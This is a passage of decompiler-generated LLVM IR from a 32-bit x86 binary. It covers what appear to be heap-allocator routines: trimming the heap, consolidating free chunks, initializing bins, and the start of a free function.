  store i32 %v0_8053d7f, i32* @ebx, align 4
  store i32 %v0_8053d7e, i32* @esi, align 4
  store i32 %v0_8053d7d, i32* @edi, align 4
  store i32 %v0_8053d7c, i32* @ebp, align 4
  ret i32 %v0_805409d

; uselistorder directives
  uselistorder i32 %v1_8054051, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8054025, { 1, 0, 2 }
  uselistorder i32 %v2_805400d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8053feb, { 1, 0, 2 }
  uselistorder i32 %v1_8053fc6, { 1, 0, 2 }
  uselistorder i32 %v3_8053fc3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8053f81, { 1, 0 }
  uselistorder i32 %v1_8053ee7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8053ebb, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8053e5f, { 1, 0, 2 }
  uselistorder i32 %v3_8053e72, { 0, 2, 1 }
  uselistorder i32 %v2_8053e2f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053e11, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8053e09, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8053dfe, { 1, 0 }
  uselistorder i32 %v1_8053dee, { 0, 2, 1 }
  uselistorder i32 %v0_8053dd7, { 1, 0 }
  uselistorder i32 %v2_8053dbe, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 39, 42, 43, 44, 45, 0, 46, 47, 48, 49, 50 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_80542d9, { 10, 9, 8, 7, 0, 3, 2, 1, 6, 5, 11, 4 }
  uselistorder i32 (i32)* @function_8053514, { 6, 5, 4, 0, 1, 3, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2 }
  uselistorder label %dec_label_pc_805409a, { 1, 0 }
  uselistorder label %dec_label_pc_8054097, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054089, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805407c, { 1, 0 }
  uselistorder label %dec_label_pc_8054038, { 1, 0 }
  uselistorder label %dec_label_pc_8054025, { 1, 0 }
  uselistorder label %dec_label_pc_8053fad, { 1, 0 }
  uselistorder label %dec_label_pc_8053f60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053f4c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053ea5, { 1, 0 }
  uselistorder label %dec_label_pc_8053e05, { 1, 0 }
}

define i32 @function_80540a4() local_unnamed_addr {
dec_label_pc_80540a4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80540ab = load i32, i32* @edx, align 4
  store i32 %v0_80540ab, i32* %ebp.global-to-local, align 4
  %v1_80540ad = add i32 %v0_80540ab, 860
  %v2_80540ad = inttoptr i32 %v1_80540ad to i32*
  %v3_80540ad = load i32, i32* %v2_80540ad, align 4
  store i32 %v3_80540ad, i32* %ecx.global-to-local, align 4
  %v1_80540b3 = add i32 %v0_80540ab, 44
  %v2_80540b3 = inttoptr i32 %v1_80540b3 to i32*
  %v3_80540b3 = load i32, i32* %v2_80540b3, align 4
  %v1_80540b6 = add i32 %v3_80540b3, 4
  %v2_80540b6 = inttoptr i32 %v1_80540b6 to i32*
  %v3_80540b6 = load i32, i32* %v2_80540b6, align 4
  %v1_80540b9 = and i32 %v3_80540b6, -4
  store i32 %v1_80540b9, i32* @esi, align 4
  %v1_80540be = load i32, i32* @eax, align 4
  %v2_80540be = add i32 %v3_80540ad, -17
  %v2_80540c0 = add i32 %v2_80540be, %v1_80540b9
  %v3_80540c0 = sub i32 %v2_80540c0, %v1_80540be
  %div = udiv i32 %v3_80540c0, %v3_80540ad
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80540c0, %v3_80540ad
  store i32 %tmp10, i32* @edx, align 4
  %v1_80540c8 = add i32 %div, -1
  %v4_80540cb = mul i32 %v1_80540c8, %v3_80540ad
  store i32 %v4_80540cb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80540cb, 1
  br i1 %tmp11, label %dec_label_pc_8054127, label %dec_label_pc_80540d2

dec_label_pc_80540d2:                             ; preds = %dec_label_pc_80540a4
  %v1_80540d7 = call i32 @function_8055209(i32 0)
  store i32 %v1_80540d7, i32* %edi.global-to-local, align 4
  %v0_80540de = load i32, i32* @esi, align 4
  store i32 %v0_80540de, i32* %eax.global-to-local, align 4
  %v1_80540e0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80540e0 = add i32 %v1_80540e0, 44
  %v3_80540e0 = inttoptr i32 %v2_80540e0 to i32*
  %v4_80540e0 = load i32, i32* %v3_80540e0, align 4
  %v5_80540e0 = add i32 %v4_80540e0, %v0_80540de
  store i32 %v5_80540e0, i32* %eax.global-to-local, align 4
  %v12_80540e6 = icmp eq i32 %v1_80540d7, %v5_80540e0
  %v1_80540e8 = icmp eq i1 %v12_80540e6, false
  br i1 %v1_80540e8, label %dec_label_pc_8054127, label %dec_label_pc_80540ea

dec_label_pc_80540ea:                             ; preds = %dec_label_pc_80540d2
  %v1_80540ed = sub i32 0, %v4_80540cb
  store i32 %v1_80540ed, i32* @ebx, align 4
  %v1_80540f0 = call i32 @function_8055209(i32 %v1_80540ed)
  store i32 %v1_80540f0, i32* %eax.global-to-local, align 4
  %v1_80540fc = call i32 @function_8055209(i32 0)
  store i32 %v1_80540fc, i32* %eax.global-to-local, align 4
  %v10_8054104 = icmp eq i32 %v1_80540fc, -1
  br i1 %v10_8054104, label %dec_label_pc_8054127, label %dec_label_pc_8054109

dec_label_pc_8054109:                             ; preds = %dec_label_pc_80540ea
  %v0_8054109 = load i32, i32* %edi.global-to-local, align 4
  %v2_805410b = sub i32 %v0_8054109, %v1_80540fc
  %v12_805410b = icmp eq i32 %v2_805410b, 0
  store i32 %v2_805410b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805410b, label %dec_label_pc_8054127, label %dec_label_pc_805410f

dec_label_pc_805410f:                             ; preds = %dec_label_pc_8054109
  %v0_805410f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805410f = add i32 %v0_805410f, 44
  %v2_805410f = inttoptr i32 %v1_805410f to i32*
  %v3_805410f = load i32, i32* %v2_805410f, align 4
  store i32 %v3_805410f, i32* %eax.global-to-local, align 4
  %v1_8054112 = add i32 %v0_805410f, 872
  %v2_8054112 = inttoptr i32 %v1_8054112 to i32*
  %v3_8054112 = load i32, i32* %v2_8054112, align 4
  %v5_8054112 = sub i32 %v3_8054112, %v2_805410b
  store i32 %v5_8054112, i32* %v2_8054112, align 4
  %v0_8054118 = load i32, i32* @esi, align 4
  %v1_8054118 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054118 = sub i32 %v0_8054118, %v1_8054118
  %v1_805411a = or i32 %v2_8054118, 1
  %v1_805411d = load i32, i32* %eax.global-to-local, align 4
  %v2_805411d = add i32 %v1_805411d, 4
  %v3_805411d = inttoptr i32 %v2_805411d to i32*
  store i32 %v1_805411a, i32* %v3_805411d, align 4
  br label %dec_label_pc_8054129

dec_label_pc_8054127:                             ; preds = %dec_label_pc_8054109, %dec_label_pc_80540ea, %dec_label_pc_80540d2, %dec_label_pc_80540a4
  br label %dec_label_pc_8054129

dec_label_pc_8054129:                             ; preds = %dec_label_pc_805410f, %dec_label_pc_8054127
  %storemerge = phi i32 [ 1, %dec_label_pc_805410f ], [ 0, %dec_label_pc_8054127 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80540fc, { 1, 0, 2 }
  uselistorder i32 %v4_80540cb, { 1, 2, 0 }
  uselistorder i32 %v3_80540ad, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8055209, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054129, { 1, 0 }
}

define i32 @function_8054131(i32* %arg1) local_unnamed_addr {
dec_label_pc_8054131:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8054132 = load i32, i32* @edi, align 4
  %v0_8054133 = load i32, i32* @esi, align 4
  %v0_8054134 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805413c = load i32, i32* %arg1, align 4
  store i32 %v2_805413c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8054143 = icmp eq i32 %v2_805413c, 0
  br i1 %v1_8054143, label %dec_label_pc_805425d.lr.ph, label %dec_label_pc_805414b

dec_label_pc_805425d.lr.ph:                       ; preds = %dec_label_pc_8054131
  %v3_8054261 = add i32 %tmp20, 44
  br label %dec_label_pc_805425d

dec_label_pc_805414b:                             ; preds = %dec_label_pc_8054131
  %v1_805414f = and i32 %v2_805413c, -3
  store i32 %v1_805414f, i32* %arg1, align 4
  %v1_8054154 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_805415f = add i32 %tmp20, 4
  store i32 %v1_805415f, i32* %eax.global-to-local, align 4
  %v2_805416a = load i32, i32* %arg1, align 4
  %v2_8054170 = udiv i32 %v2_805416a, 8
  %v2_8054173 = mul nuw i32 %v2_8054170, 4
  %v3_8054173 = add i32 %tmp20, -4
  %v4_8054173 = add i32 %v3_8054173, %v2_8054173
  store i32 %v4_8054173, i32* %eax.global-to-local, align 4
  %v2_805423a = add i32 %tmp20, 44
  %v3_805423a = inttoptr i32 %v2_805423a to i32*
  %v1_805420d = add i32 %tmp20, 60
  %v2_805420d = inttoptr i32 %v1_805420d to i32*
  br label %dec_label_pc_805417b

dec_label_pc_805417b:                             ; preds = %dec_label_pc_8054253, %dec_label_pc_805414b
  %v0_8054189 = phi i32 [ %v1_805415f, %dec_label_pc_805414b ], [ %v4_8054253, %dec_label_pc_8054253 ]
  store i32 %v0_8054189, i32* %eax.global-to-local, align 4
  %v1_805417f = inttoptr i32 %v0_8054189 to i32*
  %v2_805417f = load i32, i32* %v1_805417f, align 4
  store i32 %v2_805417f, i32* @ecx, align 4
  %v1_8054181 = icmp eq i32 %v2_805417f, 0
  br i1 %v1_8054181, label %dec_label_pc_8054249, label %dec_label_pc_8054189

dec_label_pc_8054189:                             ; preds = %dec_label_pc_805417b
  store i32 0, i32* %v1_805417f, align 4
  %v0_805418f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805418f

dec_label_pc_805418f:                             ; preds = %dec_label_pc_805423d, %dec_label_pc_8054189
  %v0_80541ac = phi i32 [ %v3_805418f, %dec_label_pc_805423d ], [ %v0_805418f.pre, %dec_label_pc_8054189 ]
  %v1_805418f = add i32 %v0_80541ac, 8
  %v2_805418f = inttoptr i32 %v1_805418f to i32*
  %v3_805418f = load i32, i32* %v2_805418f, align 4
  store i32 %v3_805418f, i32* %edx.global-to-local, align 4
  %v1_8054196 = add i32 %v0_80541ac, 4
  %v2_8054196 = inttoptr i32 %v1_8054196 to i32*
  %v3_8054196 = load i32, i32* %v2_8054196, align 4
  store i32 %v3_8054196, i32* %eax.global-to-local, align 4
  %v1_805419b = and i32 %v3_8054196, -2
  store i32 %v1_805419b, i32* @edi, align 4
  %v2_805419e = urem i32 %v3_8054196, 2
  %v3_805419e = icmp eq i32 %v2_805419e, 0
  %v2_80541a0 = add i32 %v1_805419b, %v0_80541ac
  store i32 %v2_80541a0, i32* @ebx, align 4
  %v1_80541a3 = add i32 %v2_80541a0, 4
  %v2_80541a3 = inttoptr i32 %v1_80541a3 to i32*
  %v3_80541a3 = load i32, i32* %v2_80541a3, align 4
  store i32 %v3_80541a3, i32* %edx.global-to-local, align 4
  %v1_80541aa = icmp eq i1 %v3_805419e, false
  br i1 %v1_80541aa, label %dec_label_pc_80541cc, label %dec_label_pc_80541ac

dec_label_pc_80541ac:                             ; preds = %dec_label_pc_805418f
  %v1_80541ac = inttoptr i32 %v0_80541ac to i32*
  %v2_80541ac = load i32, i32* %v1_80541ac, align 4
  store i32 %v2_80541ac, i32* %ebp.global-to-local, align 4
  %v2_80541b0 = sub i32 %v0_80541ac, %v2_80541ac
  store i32 %v2_80541b0, i32* %eax.global-to-local, align 4
  %v1_80541b2 = add i32 %v2_80541b0, 8
  %v2_80541b2 = inttoptr i32 %v1_80541b2 to i32*
  %v3_80541b2 = load i32, i32* %v2_80541b2, align 4
  store i32 %v3_80541b2, i32* @esi, align 4
  %v1_80541b5 = add i32 %v2_80541b0, 12
  %v2_80541b5 = inttoptr i32 %v1_80541b5 to i32*
  %v3_80541b5 = load i32, i32* %v2_80541b5, align 4
  store i32 %v3_80541b5, i32* %edx.global-to-local, align 4
  %v1_80541b8 = add i32 %v3_80541b2, 12
  %v2_80541b8 = inttoptr i32 %v1_80541b8 to i32*
  %v3_80541b8 = load i32, i32* %v2_80541b8, align 4
  store i32 %v3_80541b8, i32* @ecx, align 4
  %v12_80541bb = icmp eq i32 %v3_80541b8, %v2_80541b0
  %v1_80541bd = icmp eq i1 %v12_80541bb, false
  br i1 %v1_80541bd, label %dec_label_pc_80541fc, label %dec_label_pc_80541bf

dec_label_pc_80541bf:                             ; preds = %dec_label_pc_80541ac
  %v1_80541bf = add i32 %v3_80541b5, 8
  %v2_80541bf = inttoptr i32 %v1_80541bf to i32*
  %v3_80541bf = load i32, i32* %v2_80541bf, align 4
  %v15_80541bf = icmp eq i32 %v3_80541bf, %v3_80541b8
  %v1_80541c2 = icmp eq i1 %v15_80541bf, false
  br i1 %v1_80541c2, label %dec_label_pc_80541fc, label %dec_label_pc_80541c4

dec_label_pc_80541c4:                             ; preds = %dec_label_pc_80541bf
  %v2_80541c4 = add i32 %v2_80541ac, %v1_805419b
  store i32 %v2_80541c4, i32* @edi, align 4
  store i32 %v3_80541b5, i32* %v2_80541b8, align 4
  %v0_80541c9 = load i32, i32* @esi, align 4
  %v1_80541c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80541c9 = add i32 %v1_80541c9, 8
  %v3_80541c9 = inttoptr i32 %v2_80541c9 to i32*
  store i32 %v0_80541c9, i32* %v3_80541c9, align 4
  %v0_80541d7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80541cc

dec_label_pc_80541cc:                             ; preds = %dec_label_pc_805418f, %dec_label_pc_80541c4
  %v1_80541e0 = phi i32 [ %v2_80541a0, %dec_label_pc_805418f ], [ %v0_80541d7.pre, %dec_label_pc_80541c4 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80541d4 = and i32 %v3_80541a3, -4
  store i32 %v1_80541d4, i32* %ebp.global-to-local, align 4
  %v4_80541d7 = load i32, i32* %v3_805423a, align 4
  %v15_80541d7 = icmp eq i32 %v1_80541e0, %v4_80541d7
  br i1 %v15_80541d7, label %dec_label_pc_805422d, label %dec_label_pc_80541dc

dec_label_pc_80541dc:                             ; preds = %dec_label_pc_80541cc
  %v2_80541dc = add i32 %v1_80541e0, 4
  %v3_80541dc = add i32 %v2_80541dc, %v1_80541d4
  %v4_80541dc = inttoptr i32 %v3_80541dc to i32*
  %v5_80541dc = load i32, i32* %v4_80541dc, align 4
  store i32 %v5_80541dc, i32* %eax.global-to-local, align 4
  %v3_80541e0 = inttoptr i32 %v2_80541dc to i32*
  store i32 %v1_80541d4, i32* %v3_80541e0, align 4
  %v0_80541e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80541e3 = urem i32 %v0_80541e3, 2
  %v2_80541e3 = icmp eq i32 %v1_80541e3, 0
  store i32 %v1_80541e3, i32* %eax.global-to-local, align 4
  %v1_80541e8 = icmp eq i1 %v2_80541e3, false
  br i1 %v1_80541e8, label %dec_label_pc_8054209, label %dec_label_pc_80541ea

dec_label_pc_80541ea:                             ; preds = %dec_label_pc_80541dc
  %v0_80541ea = load i32, i32* @ebx, align 4
  %v1_80541ea = add i32 %v0_80541ea, 8
  %v2_80541ea = inttoptr i32 %v1_80541ea to i32*
  %v3_80541ea = load i32, i32* %v2_80541ea, align 4
  store i32 %v3_80541ea, i32* @edx, align 4
  %v1_80541ed = add i32 %v0_80541ea, 12
  %v2_80541ed = inttoptr i32 %v1_80541ed to i32*
  %v3_80541ed = load i32, i32* %v2_80541ed, align 4
  store i32 %v3_80541ed, i32* %eax.global-to-local, align 4
  %v1_80541f0 = add i32 %v3_80541ea, 12
  %v2_80541f0 = inttoptr i32 %v1_80541f0 to i32*
  %v3_80541f0 = load i32, i32* %v2_80541f0, align 4
  store i32 %v3_80541f0, i32* @esi, align 4
  %v12_80541f3 = icmp eq i32 %v3_80541f0, %v0_80541ea
  %v1_80541f5 = icmp eq i1 %v12_80541f3, false
  br i1 %v1_80541f5, label %dec_label_pc_80541fc, label %dec_label_pc_80541f7

dec_label_pc_80541f7:                             ; preds = %dec_label_pc_80541ea
  %v1_80541f7 = add i32 %v3_80541ed, 8
  %v2_80541f7 = inttoptr i32 %v1_80541f7 to i32*
  %v3_80541f7 = load i32, i32* %v2_80541f7, align 4
  %v15_80541f7 = icmp eq i32 %v3_80541f7, %v3_80541f0
  br i1 %v15_80541f7, label %dec_label_pc_8054201, label %dec_label_pc_80541fc

dec_label_pc_80541fc:                             ; preds = %dec_label_pc_80541f7, %dec_label_pc_80541ea, %dec_label_pc_80541bf, %dec_label_pc_80541ac
  %v0_80541fc = call i32 @function_8054475()
  store i32 %v0_80541fc, i32* %eax.global-to-local, align 4
  %v1_8054203.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054201

dec_label_pc_8054201:                             ; preds = %dec_label_pc_80541f7, %dec_label_pc_80541fc
  %v1_8054203 = phi i32 [ %v3_80541ea, %dec_label_pc_80541f7 ], [ %v1_8054203.pre, %dec_label_pc_80541fc ]
  %v0_8054203 = phi i32 [ %v3_80541ed, %dec_label_pc_80541f7 ], [ %v0_80541fc, %dec_label_pc_80541fc ]
  %v0_8054201 = load i32, i32* @edi, align 4
  %v1_8054201 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054201 = add i32 %v1_8054201, %v0_8054201
  store i32 %v2_8054201, i32* @edi, align 4
  %v2_8054203 = add i32 %v1_8054203, 12
  %v3_8054203 = inttoptr i32 %v2_8054203 to i32*
  store i32 %v0_8054203, i32* %v3_8054203, align 4
  %v0_8054206 = load i32, i32* @edx, align 4
  %v1_8054206 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054206 = add i32 %v1_8054206, 8
  %v3_8054206 = inttoptr i32 %v2_8054206 to i32*
  store i32 %v0_8054206, i32* %v3_8054206, align 4
  br label %dec_label_pc_8054209

dec_label_pc_8054209:                             ; preds = %dec_label_pc_80541dc, %dec_label_pc_8054201
  store i32 %v1_8054154, i32* %eax.global-to-local, align 4
  %v3_805420d = load i32, i32* %v2_805420d, align 4
  store i32 %v3_805420d, i32* @edx, align 4
  %v0_8054210 = load i32, i32* @ecx, align 4
  store i32 %v0_8054210, i32* %v2_805420d, align 4
  %v0_8054213 = load i32, i32* @edi, align 4
  %v1_8054215 = or i32 %v0_8054213, 1
  store i32 %v1_8054215, i32* %eax.global-to-local, align 4
  %v0_8054218 = load i32, i32* @ecx, align 4
  %v1_8054218 = load i32, i32* @edx, align 4
  %v2_8054218 = add i32 %v1_8054218, 12
  %v3_8054218 = inttoptr i32 %v2_8054218 to i32*
  store i32 %v0_8054218, i32* %v3_8054218, align 4
  %v0_805421b = load i32, i32* %eax.global-to-local, align 4
  %v1_805421b = load i32, i32* @ecx, align 4
  %v2_805421b = add i32 %v1_805421b, 4
  %v3_805421b = inttoptr i32 %v2_805421b to i32*
  store i32 %v0_805421b, i32* %v3_805421b, align 4
  store i32 %v1_8054154, i32* %eax.global-to-local, align 4
  %v0_8054222 = load i32, i32* @edx, align 4
  %v1_8054222 = load i32, i32* @ecx, align 4
  %v2_8054222 = add i32 %v1_8054222, 8
  %v3_8054222 = inttoptr i32 %v2_8054222 to i32*
  store i32 %v0_8054222, i32* %v3_8054222, align 4
  %v0_8054225 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054225 = load i32, i32* @ecx, align 4
  %v2_8054225 = add i32 %v1_8054225, 12
  %v3_8054225 = inttoptr i32 %v2_8054225 to i32*
  store i32 %v0_8054225, i32* %v3_8054225, align 4
  %v0_8054228 = load i32, i32* @edi, align 4
  %v1_8054228 = load i32, i32* @ecx, align 4
  %v3_8054228 = add i32 %v1_8054228, %v0_8054228
  %v4_8054228 = inttoptr i32 %v3_8054228 to i32*
  store i32 %v0_8054228, i32* %v4_8054228, align 4
  br label %dec_label_pc_805423d

dec_label_pc_805422d:                             ; preds = %dec_label_pc_80541cc
  %v0_805422d = load i32, i32* @edi, align 4
  %v2_805422d = add i32 %v0_805422d, %v1_80541d4
  %v1_8054230 = or i32 %v2_805422d, 1
  store i32 %v1_8054230, i32* %eax.global-to-local, align 4
  %v1_8054233 = load i32, i32* @ecx, align 4
  %v2_8054233 = add i32 %v1_8054233, 4
  %v3_8054233 = inttoptr i32 %v2_8054233 to i32*
  store i32 %v1_8054230, i32* %v3_8054233, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805423a = load i32, i32* @ecx, align 4
  store i32 %v0_805423a, i32* %v3_805423a, align 4
  br label %dec_label_pc_805423d

dec_label_pc_805423d:                             ; preds = %dec_label_pc_8054209, %dec_label_pc_805422d
  store i32 %v3_805418f, i32* @ecx, align 4
  %v1_8054241 = icmp eq i32 %v3_805418f, 0
  %v1_8054243 = icmp eq i1 %v1_8054241, false
  br i1 %v1_8054243, label %dec_label_pc_805418f, label %dec_label_pc_8054249

dec_label_pc_8054249:                             ; preds = %dec_label_pc_805423d, %dec_label_pc_805417b
  %v15_805424d = icmp eq i32 %v0_8054189, %v4_8054173
  br i1 %v15_805424d, label %dec_label_pc_80542d1, label %dec_label_pc_8054253

dec_label_pc_8054253:                             ; preds = %dec_label_pc_8054249
  %v4_8054253 = add i32 %v0_8054189, 4
  br label %dec_label_pc_805417b

dec_label_pc_805425d:                             ; preds = %dec_label_pc_805425d.lr.ph, %dec_label_pc_805425d
  %v1_8054261 = phi i32 [ 1, %dec_label_pc_805425d.lr.ph ], [ %v0_805426c, %dec_label_pc_805425d ]
  %v2_8054261 = mul i32 %v1_8054261, 8
  %v4_8054261 = add i32 %v3_8054261, %v2_8054261
  store i32 %v4_8054261, i32* %eax.global-to-local, align 4
  %v1_8054265 = add i32 %v1_8054261, 1
  store i32 %v1_8054265, i32* %edx.global-to-local, align 4
  %v2_8054266 = add i32 %v4_8054261, 12
  %v3_8054266 = inttoptr i32 %v2_8054266 to i32*
  store i32 %v4_8054261, i32* %v3_8054266, align 4
  %v0_8054269 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054269 = add i32 %v0_8054269, 8
  %v3_8054269 = inttoptr i32 %v2_8054269 to i32*
  store i32 %v0_8054269, i32* %v3_8054269, align 4
  %v0_805426c = load i32, i32* %edx.global-to-local, align 4
  %v7_805426f = icmp sgt i32 %v0_805426c, 95
  br i1 %v7_805426f, label %dec_label_pc_8054271, label %dec_label_pc_805425d

dec_label_pc_8054271:                             ; preds = %dec_label_pc_805425d
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8054275 = add i32 %tmp20, 864
  %v2_8054275 = inttoptr i32 %v1_8054275 to i32*
  %v3_8054275 = load i32, i32* %v2_8054275, align 4
  %v4_8054275 = or i32 %v3_8054275, 1
  store i32 %v4_8054275, i32* %v2_8054275, align 4
  %v0_805427c = load i32, i32* %eax.global-to-local, align 4
  %v1_805427c = add i32 %v0_805427c, 840
  %v2_805427c = inttoptr i32 %v1_805427c to i32*
  store i32 0, i32* %v2_805427c, align 4
  %v0_8054286 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054286 = add i32 %v0_8054286, 852
  %v2_8054286 = inttoptr i32 %v1_8054286 to i32*
  store i32 65536, i32* %v2_8054286, align 4
  %v0_8054290 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054290 = add i32 %v0_8054290, 844
  %v2_8054290 = inttoptr i32 %v1_8054290 to i32*
  store i32 262144, i32* %v2_8054290, align 4
  %v0_805429a = load i32, i32* %eax.global-to-local, align 4
  %v1_805429a = add i32 %v0_805429a, 836
  %v2_805429a = inttoptr i32 %v1_805429a to i32*
  store i32 262144, i32* %v2_805429a, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_80542ab = load i32, i32* %arg1, align 4
  %v1_80542ad = urem i32 %v2_80542ab, 4
  %v1_80542b0 = or i32 %v1_80542ad, 72
  store i32 %v1_80542b0, i32* %arg1, align 4
  %v0_80542b5 = load i32, i32* @edx, align 4
  %v1_80542b7 = add i32 %v0_80542b5, 52
  store i32 %v1_80542b7, i32* %eax.global-to-local, align 4
  %v2_80542ba = add i32 %v0_80542b5, 44
  %v3_80542ba = inttoptr i32 %v2_80542ba to i32*
  store i32 %v1_80542b7, i32* %v3_80542ba, align 4
  %v1_80542bf = call i32 @function_80548b9(i32 30)
  store i32 %v1_80542bf, i32* %eax.global-to-local, align 4
  %v2_80542cb = add i32 %tmp20, 860
  %v3_80542cb = inttoptr i32 %v2_80542cb to i32*
  store i32 %v1_80542bf, i32* %v3_80542cb, align 4
  br label %dec_label_pc_80542d1

dec_label_pc_80542d1:                             ; preds = %dec_label_pc_8054249, %dec_label_pc_8054271
  store i32 %v0_8054134, i32* @ebx, align 4
  store i32 %v0_8054133, i32* @esi, align 4
  store i32 %v0_8054132, i32* @edi, align 4
  %v0_80542d8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80542d8

; uselistorder directives
  uselistorder i32 %v0_805426c, { 1, 0 }
  uselistorder i32 %v0_8054269, { 1, 0 }
  uselistorder i32 %v1_8054261, { 1, 0 }
  uselistorder i32 %v0_8054228, { 1, 0 }
  uselistorder i32 %v1_80541e3, { 1, 0 }
  uselistorder i32 %v2_80541dc, { 1, 0 }
  uselistorder i32 %v1_80541d4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80541e0, { 1, 0 }
  uselistorder i32 %v3_805418f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80541ac, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8054189, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805423a, { 1, 0 }
  uselistorder i32 %v1_8054154, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_80542d1, { 1, 0 }
  uselistorder label %dec_label_pc_805425d, { 1, 0 }
  uselistorder label %dec_label_pc_805423d, { 1, 0 }
  uselistorder label %dec_label_pc_8054209, { 1, 0 }
  uselistorder label %dec_label_pc_8054201, { 1, 0 }
  uselistorder label %dec_label_pc_80541cc, { 1, 0 }
}

define i32 @function_80542d9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80542d9:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80542d9 = load i32, i32* @ebp, align 4
  %v0_80542da = load i32, i32* @edi, align 4
  %v0_80542db = load i32, i32* @esi, align 4
  %v0_80542dc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80542e4 = icmp eq i32 %arg1, 0
  br i1 %v1_80542e4, label %dec_label_pc_805446d, label %dec_label_pc_80542ec

dec_label_pc_80542ec:                             ; preds = %dec_label_pc_80542d9
  %v2_80542f7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80542f7, i32* @eax, align 4
  %v2_80542fc = call i32 @function_8054a40(i32 %v2_80542f7, i32 134564413)
  store i32 %v2_80542fc, i32* %eax.global-to-local, align 4
  %v1_8054308 = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571a0.205 to i32))
  %v1_805430d = add i32 %arg1, -8
  store i32 %v1_805430d, i32* @ecx, align 4
  %v0_8054310 = load i8, i8* @global_var_8057540.206, align 1
  %v1_8054310 = sext i8 %v0_8054310 to i32
  store i32 %v1_8054310, i32* %eax.global-to-local, align 4
